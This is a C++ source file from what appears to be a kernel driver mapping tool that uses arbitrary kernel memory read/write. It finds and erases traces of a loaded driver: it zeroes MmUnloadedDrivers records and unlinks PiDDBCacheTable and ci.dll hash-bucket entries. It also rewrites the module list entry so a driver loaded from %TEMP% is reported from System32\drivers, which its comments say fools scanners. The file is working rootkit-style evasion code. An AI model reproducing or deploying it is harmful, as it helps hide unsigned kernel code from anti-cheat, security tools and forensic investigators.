#include "trace.h"

#include <cstring>
#include <vector>

#include "log.h"
#include "nal.h"

namespace
{
    /* UNLOADED_DRIVERS on x64: UNICODE_STRING Name (0x00, 16 bytes),
     * StartAddress (0x10), EndAddress (0x18), CurrentTime (0x20). */
    constexpr uint32_t kUnloadedCount = 50;
    constexpr uint64_t kUnloadedEntrySize = 0x28;
    constexpr uint64_t kUnloadedNameLength = 0x00;
    constexpr uint64_t kUnloadedNameBuffer = 0x08;

    /* _RTL_BALANCED_LINKS inside _PIDDB_CACHE_ENTRY sits 0x10 past the entry, so
     * the entry address is node - 0x10. Verified by name, never assumed. */
    constexpr uint64_t kTableRootRightChild = 0x10;
    constexpr uint64_t kEntryFromNode = 0x10;

    constexpr uint32_t kMaxNodes = 256;
    constexpr uint32_t kMaxDepth = 64;

    /* _HASH_BUCKET_ENTRY on x64: List (0x00, 16 bytes), DriverName UNICODE_STRING
     * (0x10), CertHash[5] (0x20). g_KernelHashBucketList is the list head, so the
     * first eight bytes at it are the Flink of a sentinel node. */
    constexpr uint64_t kHashEntryFlink = 0x00;
    constexpr uint64_t kHashEntryName = 0x10;
    constexpr uint64_t kHashEntrySize = 0x38;

    /* KLDR_DATA_TABLE_ENTRY on x64: InLoadOrderLinks (0x00), DllBase (0x30),
     * FullDllName (0x48), BaseDllName (0x58). Only the load-order list is walked -
     * the other two link fields point at the same entries but are not maintained for
     * a driver object. */
    constexpr uint64_t kLdrNext = 0x00;
    constexpr uint64_t kLdrDllBase = 0x30;
    constexpr uint64_t kLdrFullDllName = 0x48;
    constexpr uint64_t kLdrBaseName = 0x58;

    /*
     * g_KernelHashBucketList and g_HashCacheLock are not exported. This is the
     * ci.dll sequence that references the list; the lock is a `lea rcx,[rip+x]`
     * in the bytes just ahead of it. Neither offset is stable across builds, so
     * both are resolved from the pattern instead of being hardcoded.
     */
    constexpr uint8_t kHashPattern[] =
    {
        0x48, 0x8B, 0x1D, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x00,
        0xF7, 0x43, 0x40, 0x00, 0x20, 0x00, 0x00
    };
    constexpr char kHashMask[] = "xxx????x?xxxxxxx";

    constexpr uint8_t kLockPattern[] = { 0x48, 0x8D, 0x0D };
    constexpr char kLockMask[] = "xxx";
    constexpr uint32_t kLockSearchBack = 50;

    bool KernelRange(uint64_t address, uint64_t size)
    {
        return address >= 0xFFFF800000000000ULL &&
               address + size > address &&
               address + size <= 0xFFFFFFFFFFFFFFFFULL;
    }

    bool Aligned(uint64_t address)
    {
        return (address & 0x7) == 0;
    }

    std::wstring BaseName(const std::wstring& path)
    {
        const std::wstring::size_type pos = path.find_last_of(L"\\/");
        return pos == std::wstring::npos ? path : path.substr(pos + 1);
    }

    bool SameName(const std::wstring& left, const std::wstring& right)
    {
        return _wcsicmp(left.c_str(), right.c_str()) == 0;
    }

    /* Reads a UNICODE_STRING at address and returns its base name. False when the
     * descriptor does not look like one, which is the common case while probing. */
    bool ReadUnicodeName(uint64_t address, std::wstring* out)
    {
        uint8_t descriptor[0x10] = { 0 };
        if (!nal::ReadMemory(address, descriptor, sizeof(descriptor)))
            return false;

        const uint16_t length = *(uint16_t*)(descriptor + 0x00);
        const uint16_t maximum = *(uint16_t*)(descriptor + 0x02);
        const uint64_t buffer = *(uint64_t*)(descriptor + 0x08);

        if (!length || length > 0x200 || length > maximum || (length & 1))
            return false;

        if (!KernelRange(buffer, length))
            return false;

        wchar_t text[0x101] = { 0 };
        if (!nal::ReadMemory(buffer, text, length))
            return false;

        *out = BaseName(std::wstring(text, length / 2));
        return true;
    }
}

namespace trace
{
    /*
     * Neither target is exported by name on current builds - only their contents
     * identify them - so the export is one route and a scan is the other. Both
     * scans look only inside ntoskrnl's writable data, and both cache, so the cost
     * is paid at most once per process.
     */
    uint64_t g_unloadedArray = 0;
    bool     g_unloadedScanned = false;
    uint64_t g_piddbTable = 0;
    bool     g_piddbScanned = false;

    constexpr uint64_t kChunk = 0x10000;
    constexpr uint32_t kMaxCandidates = 256;

    /* Largest writable section of ntoskrnl, which is where both live. */
    bool KernelWritableRange(uint64_t kernelBase, uint64_t* outStart, uint64_t* outSize)
    {
        IMAGE_DOS_HEADER dos = { 0 };
        IMAGE_NT_HEADERS64 nt = { 0 };

        if (!nal::ReadMemory(kernelBase, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE)
            return false;

        if (!nal::ReadMemory(kernelBase + dos.e_lfanew, &nt, sizeof(nt)) ||
            nt.Signature != IMAGE_NT_SIGNATURE)
            return false;

        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(&nt);
        uint64_t best = 0;
        uint64_t bestSize = 0;

        for (WORD i = 0; i < nt.FileHeader.NumberOfSections; ++i, ++section)
        {
            if (!(section->Characteristics & IMAGE_SCN_MEM_WRITE) || !section->Misc.VirtualSize)
                continue;

            if (section->Misc.VirtualSize > bestSize)
            {
                best = kernelBase + section->VirtualAddress;
                bestSize = section->Misc.VirtualSize;
            }
        }

        if (!best || !bestSize)
            return false;

        *outStart = best;
        *outSize = bestSize;
        return true;
    }

    bool LooksLikeImageName(uint64_t address, std::wstring* out)
    {
        std::wstring name;

        if (!ReadUnicodeName(address, &name) || name.size() < 5)
            return false;

        if (_wcsicmp(name.c_str() + name.size() - 4, L".sys") != 0)
            return false;

        *out = name;
        return true;
    }

    /*
     * The array is kUnloadedCount records of 0x28 bytes, some holding a name that
     * ends in .sys. Candidates are picked out of the buffer without any kernel
     * read, then verified properly, which keeps the scan affordable.
     */
    uint64_t FindUnloadedArray(uint64_t kernelBase)
    {
        uint64_t start = 0;
        uint64_t size = 0;
        std::vector<uint8_t> chunk(kChunk);
        std::vector<uint64_t> candidates;

        if (!KernelWritableRange(kernelBase, &start, &size))
            return 0;

        for (uint64_t offset = 0; offset < size; offset += kChunk)
        {
            const uint64_t span = (size - offset < kChunk) ? size - offset : kChunk;

            if (!nal::ReadMemory(start + offset, chunk.data(), span))
                continue;

            candidates.clear();

            for (uint64_t i = 0; i + kUnloadedEntrySize <= span &&
                 candidates.size() < kMaxCandidates; i += 8)
            {
                const uint16_t length = *(uint16_t*)(chunk.data() + i + kUnloadedNameLength);
                const uint16_t maximum = *(uint16_t*)(chunk.data() + i + kUnloadedNameLength + 2);
                uint64_t buffer = 0;
                uint64_t lowSpan = 0;

                memcpy(&buffer, chunk.data() + i + kUnloadedNameBuffer, sizeof(buffer));
                memcpy(&lowSpan, chunk.data() + i + 0x10, sizeof(lowSpan));

                const bool named = length > 4 && length <= 0x200 && !(length & 1) &&
                                   length <= maximum && KernelRange(buffer, length);

                if (named || KernelRange(lowSpan, 0x1000))
                    candidates.push_back(start + offset + i);
            }

            for (uint64_t candidate : candidates)
            {
                int names = 0;

                for (uint32_t i = 0; i < kUnloadedCount; ++i)
                {
                    std::wstring name;

                    if (LooksLikeImageName(candidate + i * kUnloadedEntrySize, &name))
                        ++names;
                }

                if (names)
                    return candidate;
            }
        }

        return 0;
    }

    /*
     * The table is an RTL_AVL_TABLE; its root's right child at +0x10 leads to a node
     * whose entry sits 0x10 before it. A pointer into writable data that leads to a
     * node carrying a .sys name is the table.
     */
    uint64_t FindPiddbTable(uint64_t kernelBase)
    {
        uint64_t start = 0;
        uint64_t size = 0;
        std::vector<uint8_t> chunk(kChunk);

        if (!KernelWritableRange(kernelBase, &start, &size))
            return 0;

        for (uint64_t offset = 0; offset < size; offset += kChunk)
        {
            const uint64_t span = (size - offset < kChunk) ? size - offset : kChunk;

            if (!nal::ReadMemory(start + offset, chunk.data(), span))
                continue;

            for (uint64_t i = 0; i + sizeof(uint64_t) <= span; i += 8)
            {
                uint64_t table = 0;
                uint64_t root = 0;

                memcpy(&table, chunk.data() + i, sizeof(table));

                if (!KernelRange(table, 0x80))
                    continue;

                if (!nal::ReadMemory(table + kTableRootRightChild, &root, sizeof(root)))
                    continue;

                if (!root)
                    return table;

                if (!KernelRange(root, 0x20))
                    continue;

                for (uint64_t probe = 0x08; probe <= 0x58; probe += 0x08)
                {
                    std::wstring name;

                    if (LooksLikeImageName(root - kEntryFromNode + probe, &name))
                        return table;
                }
            }
        }

        return 0;
    }

    /*
     * Scans a kernel image for a masked byte pattern ('?' is a wildcard). Chunked,
     * so a multi-megabyte image never needs one big read, and overlapped by the
     * pattern length so a match straddling a chunk boundary is still found.
     */
    uint64_t FindPatternInImage(uint64_t base, uint32_t size, const uint8_t* pattern,
                                const char* mask)
    {
        const size_t length = strlen(mask);
        std::vector<uint8_t> chunk(kChunk + length);

        for (uint64_t offset = 0; offset + length <= size; offset += kChunk)
        {
            const uint64_t span =
                (size - offset < kChunk + length) ? size - offset : kChunk + length;

            if (!nal::ReadMemory(base + offset, chunk.data(), span))
                continue;

            for (uint64_t i = 0; i + length <= span; ++i)
            {
                size_t j = 0;

                for (; j < length; ++j)
                {
                    if (mask[j] != '?' && chunk[(size_t)i + j] != pattern[j])
                        break;
                }

                if (j == length)
                    return base + offset + i;
            }
        }

        return 0;
    }

    /* The disp32 at `offset` is relative to the end of the instruction, which sits
     * `length` bytes past its start. */
    uint64_t Relative(uint64_t instruction, uint64_t offset, uint64_t length)
    {
        int32_t displacement = 0;

        if (!nal::ReadMemory(instruction + offset, &displacement, sizeof(displacement)))
            return 0;

        return instruction + length + (int64_t)displacement;
    }

    /* SizeOfImage from a live image's own headers, so a scan has a bound. */
    uint32_t ImageSize(uint64_t base)
    {
        uint8_t headers[0x40] = { 0 };

        if (!nal::ReadMemory(base, headers, sizeof(headers)))
            return 0;

        if (headers[0] != 'M' || headers[1] != 'Z')
            return 0;

        int32_t ntHeaders = 0;
        memcpy(&ntHeaders, headers + 0x3C, sizeof(ntHeaders));

        if (ntHeaders <= 0)
            return 0;

        /* lfanew + NT signature (4) + IMAGE_FILE_HEADER (0x14) + SizeOfImage
         * (0x38 into the optional header). */
        uint32_t size = 0;

        if (!nal::ReadMemory(base + (uint64_t)ntHeaders + 0x50, &size, sizeof(size)))
            return 0;

        return size;
    }

    int ScrubUnloadedDrivers(const std::wstring& imageName)
    {
        const std::wstring wanted = BaseName(imageName);
        const uint64_t kernelBase = nal::ResolveKernelBase();

        if (wanted.empty() || !kernelBase)
            return 0;

        /*
         * The export is a pointer variable, so it is dereferenced to reach the
         * array. It is not exported on current builds, so the scan is the route
         * that actually works there.
         */
        const uint64_t symbol = nal::GetKernelModuleExport(kernelBase, "MmUnloadedDrivers");
        uint64_t array = 0;

        if (symbol && KernelRange(symbol, sizeof(uint64_t)))
            nal::ReadMemory(symbol, &array, sizeof(array));

        if (!array || !KernelRange(array, kUnloadedEntrySize))
        {
            if (!g_unloadedScanned)
            {
                g_unloadedArray = FindUnloadedArray(kernelBase);
                g_unloadedScanned = true;
            }

            array = g_unloadedArray;

            if (array)
                km_log::Step("MmUnloadedDrivers found by scan at 0x%llX",
                             (unsigned long long)array);
        }

        if (!array || !KernelRange(array, kUnloadedEntrySize))
        {
            km_log::Warn("MmUnloadedDrivers not resolved - unload trace left in place");
            return 0;
        }

        int cleared = 0;

        for (uint32_t i = 0; i < kUnloadedCount; ++i)
        {
            const uint64_t entry = array + i * kUnloadedEntrySize;
            std::wstring name;

            if (!ReadUnicodeName(entry, &name) || !SameName(name, wanted))
                continue;

            /* Zero the whole record: name, start, end and timestamp. A partially
             * cleared entry is still findable by its timestamp. */
            uint8_t zero[kUnloadedEntrySize] = { 0 };

            if (!nal::WriteMemory(entry, zero, sizeof(zero)))
            {
                km_log::Warn("could not clear unloaded-driver slot %u", i);
                continue;
            }

            ++cleared;
        }

        (void)kUnloadedNameLength;
        (void)kUnloadedNameBuffer;
        return cleared;
    }

    int ScrubPiddbCache(const std::wstring& imageName)
    {
        const std::wstring wanted = BaseName(imageName);
        const uint64_t kernelBase = nal::ResolveKernelBase();

        if (wanted.empty() || !kernelBase)
            return 0;

        const uint64_t symbol = nal::GetKernelModuleExport(kernelBase, "PiDDBCacheTable");
        uint64_t table = 0;

        if (symbol && KernelRange(symbol, sizeof(uint64_t)))
            nal::ReadMemory(symbol, &table, sizeof(table));

        if (!table || !KernelRange(table, 0x80))
        {
            if (!g_piddbScanned)
            {
                g_piddbTable = FindPiddbTable(kernelBase);
                g_piddbScanned = true;
            }

            table = g_piddbTable;

            if (table)
                km_log::Step("PiDDBCacheTable found by scan at 0x%llX",
                             (unsigned long long)table);
        }

        if (!table || !KernelRange(table, 0x80))
        {
            km_log::Warn("PiDDBCacheTable not resolved - cache entry left in place");
            return 0;
        }

        uint64_t root = 0;
        if (!nal::ReadMemory(table + kTableRootRightChild, &root, sizeof(root)))
            return 0;

        uint64_t stack[kMaxDepth] = { 0 };
        uint32_t depth = 0;
        uint32_t visited = 0;
        int unlinked = 0;

        if (root && KernelRange(root, 0x20))
            stack[depth++] = root;

        while (depth && visited < kMaxNodes)
        {
            const uint64_t node = stack[--depth];
            ++visited;

            if (!KernelRange(node, 0x20) || !Aligned(node))
                continue;

            const uint64_t entry = node - kEntryFromNode;

            /* The descriptor offset inside the entry has moved between builds, so
             * probe the header instead of hardcoding one. The name is validated
             * before anything is written. */
            for (uint64_t probe = 0x08; probe <= 0x58; probe += 0x08)
            {
                std::wstring name;

                if (!ReadUnicodeName(entry + probe, &name) || !SameName(name, wanted))
                    continue;

                uint64_t flink = 0;
                uint64_t blink = 0;

                if (!nal::ReadMemory(entry, &flink, sizeof(flink)) ||
                    !nal::ReadMemory(entry + 0x08, &blink, sizeof(blink)))
                    break;

                if (!KernelRange(flink, 0x10) || !KernelRange(blink, 0x10) ||
                    !Aligned(flink) || !Aligned(blink))
                    break;

                /* Only write when the neighbours still point back at this entry;
                 * otherwise the list layout is not what we think it is. */
                uint64_t check = 0;

                if (!nal::ReadMemory(flink + 0x08, &check, sizeof(check)) || check != entry ||
                    !nal::ReadMemory(blink, &check, sizeof(check)) || check != entry)
                {
                    km_log::Warn("PiDDBCache list does not point back at the entry - skipped");
                    break;
                }

                if (!nal::WriteMemory(flink + 0x08, &blink, sizeof(blink)) ||
                    !nal::WriteMemory(blink, &flink, sizeof(flink)))
                {
                    km_log::Warn("could not unlink the PiDDBCache entry");
                    break;
                }

                ++unlinked;
                break;
            }

            uint64_t left = 0;
            uint64_t right = 0;

            if (nal::ReadMemory(node + 0x08, &left, sizeof(left)) && left && KernelRange(left, 0x20) &&
                depth < kMaxDepth)
                stack[depth++] = left;

            if (nal::ReadMemory(node + 0x10, &right, sizeof(right)) && right && KernelRange(right, 0x20) &&
                depth < kMaxDepth)
                stack[depth++] = right;
        }

        return unlinked;
    }

    /*
     * ci.dll keeps a validated-image record for the life of the boot, keyed by the
     * image's own name, and it is not cleared by unloading: cleaning
     * MmUnloadedDrivers and the PiDDB cache still leaves this list holding the
     * host image's name until reboot.
     *
     * Neither the list nor its lock is exported, so both are resolved from the
     * ci.dll byte sequence that references them. The walk runs under the cache
     * lock through the kernel-call trampoline, and every write is validated
     * first - the descriptor must read as a real name and both neighbours must
     * point back at the entry - because a half-unlinked list here faults the
     * machine rather than just losing the scrub.
     */
    int ScrubHashBucketList(const std::wstring& imageName)
    {
        const std::wstring wanted = BaseName(imageName);
        const uint64_t kernelBase = nal::ResolveKernelBase();

        if (wanted.empty() || !kernelBase)
            return 0;

        const uint64_t ci = nal::GetKernelModuleBase("ci.dll");

        if (!ci)
        {
            km_log::Warn("ci.dll not resolved - hash bucket entry left in place");
            return 0;
        }

        const uint32_t size = ImageSize(ci);

        if (!size)
            return 0;

        const uint64_t hit = FindPatternInImage(ci, size, kHashPattern, kHashMask);

        if (!hit)
        {
            km_log::Warn("g_KernelHashBucketList not found - hash bucket entry left in place");
            return 0;
        }

        const uint64_t list = Relative(hit, 3, 7);

        /* The lock reference is a few bytes ahead of the list reference. */
        const uint64_t lockHit =
            FindPatternInImage(hit - kLockSearchBack, kLockSearchBack, kLockPattern, kLockMask);

        if (!list || !lockHit)
        {
            km_log::Warn("g_HashCacheLock not found - hash bucket entry left in place");
            return 0;
        }

        const uint64_t lock = Relative(lockHit, 3, 7);

        if (!KernelRange(list, 0x10) || !KernelRange(lock, 0x10))
            return 0;

        const uint64_t acquire =
            nal::GetKernelModuleExport(kernelBase, "ExAcquireResourceExclusiveLite");
        const uint64_t release =
            nal::GetKernelModuleExport(kernelBase, "ExReleaseResourceLite");

        if (!acquire || !release)
        {
            km_log::Warn("cache lock helpers unresolved - hash bucket entry left in place");
            return 0;
        }

        uint64_t locked = 0;

        if (!nal::CallKernelFunction(&locked, acquire, lock, (uint64_t)1) || !locked)
        {
            km_log::Warn("g_HashCacheLock could not be taken - hash bucket entry left in place");
            return 0;
        }

        int unlinked = 0;
        uint64_t entry = 0;

        if (!nal::ReadMemory(list, &entry, sizeof(entry)))
            entry = 0;

        for (uint32_t guard = 0; entry && KernelRange(entry, kHashEntrySize) && guard < kMaxNodes;
             ++guard)
        {
            uint64_t next = 0;

            if (!nal::ReadMemory(entry + kHashEntryFlink, &next, sizeof(next)))
                break;

            std::wstring name;

            if (ReadUnicodeName(entry + kHashEntryName, &name) && SameName(name, wanted))
            {
                uint64_t flink = 0;
                uint64_t blink = 0;

                if (nal::ReadMemory(entry, &flink, sizeof(flink)) &&
                    nal::ReadMemory(entry + 0x08, &blink, sizeof(blink)) &&
                    KernelRange(flink, 0x10) && KernelRange(blink, 0x10) &&
                    Aligned(flink) && Aligned(blink))
                {
                    uint64_t check = 0;

                    if (nal::ReadMemory(flink + 0x08, &check, sizeof(check)) && check == entry &&
                        nal::ReadMemory(blink, &check, sizeof(check)) && check == entry &&
                        nal::WriteMemory(flink + 0x08, &blink, sizeof(blink)) &&
                        nal::WriteMemory(blink, &flink, sizeof(flink)))
                    {
                        ++unlinked;

                        /* The entry's own forward link is the next node. */
                        next = flink;
                    }
                }
            }

            entry = next;
        }

        uint64_t released = 0;

        if (!nal::CallKernelFunction(&released, release, lock))
            km_log::Warn("g_HashCacheLock could not be released");

        return unlinked;
    }

    void Scrub(const std::wstring& imageName)
    {
        const int unloaded = ScrubUnloadedDrivers(imageName);
        const int cached = ScrubPiddbCache(imageName);
        const int hashed = ScrubHashBucketList(imageName);

        if (unloaded || cached || hashed)
            km_log::Good("trace scrub: %d unload slot(s), %d cache entry(ies), %d hash entry(ies) "
                         "cleared for %ls",
                          unloaded, cached, hashed, BaseName(imageName).c_str());
        else
            km_log::Warn("trace scrub found nothing for %ls", BaseName(imageName).c_str());
    }

    /*
     * Rewrites the host's own module-list entry so the path ntoskrnl recorded for a
     * loaded driver stops pointing at %TEMP%.
     *
     * This is what a scanner actually reads. For a loaded driver the path comes out
     * of its KLDR_DATA_TABLE_ENTRY, not off the disk, so deleting the file leaves the
     * recorded name untouched and the driver stays named by where it was loaded from.
     *
     * The base name is kept deliberately: the unload scrub matches on it, and the
     * MmUnloadedDrivers record written at unload takes the same name. Only the
     * directory is disguised, into where an in-box driver of that name would sit.
     */
    bool DisguiseLoadedModule(const std::wstring& imageName)
    {
        const std::wstring wanted = BaseName(imageName);

        if (wanted.empty())
            return false;

        const uint64_t kernelBase = nal::ResolveKernelBase();

        if (!kernelBase)
        {
            km_log::Warn("kernel base unresolved - host keeps its real path");
            return false;
        }

        const uint64_t list = nal::GetKernelModuleExport(kernelBase, "PsLoadedModuleList");

        if (!list || !KernelRange(list, 0x10))
        {
            km_log::Warn("PsLoadedModuleList unresolved - host keeps its real path");
            return false;
        }

        uint64_t head = 0;

        if (!nal::ReadMemory(list, &head, sizeof(head)))
            return false;

        for (uint32_t guard = 0; head && head != list && guard < kMaxNodes; ++guard)
        {
            const uint64_t entry = head;
            uint64_t dllBase = 0;
            std::wstring name;

            if (!nal::ReadMemory(entry + kLdrNext, &head, sizeof(head)))
                return false;

            if (!nal::ReadMemory(entry + kLdrDllBase, &dllBase, sizeof(dllBase)) ||
                !KernelRange(dllBase, 0x1000))
                continue;

            if (!ReadUnicodeName(entry + kLdrBaseName, &name) || !SameName(name, wanted))
                continue;

            const std::wstring disguised =
                std::wstring(L"\\SystemRoot\\System32\\drivers\\") + wanted;
            const uint32_t bytes = (uint32_t)(disguised.size() * sizeof(wchar_t));

            const uint64_t buffer = nal::AllocatePool(bytes + sizeof(wchar_t));

            if (!buffer)
                return false;

            if (!nal::WriteMemory(buffer, (void*)disguised.c_str(), bytes + sizeof(wchar_t)))
                return false;

            uint8_t descriptor[0x10] = { 0 };
            *(uint16_t*)(descriptor + 0x00) = (uint16_t)bytes;
            *(uint16_t*)(descriptor + 0x02) = (uint16_t)(bytes + sizeof(wchar_t));
            *(uint64_t*)(descriptor + 0x08) = buffer;

            if (!nal::WriteMemory(entry + kLdrFullDllName, descriptor, sizeof(descriptor)))
                return false;

            km_log::Good("host now reported as %ls", disguised.c_str());
            return true;
        }

        km_log::Warn("host entry not found in PsLoadedModuleList");
        return false;
    }
}
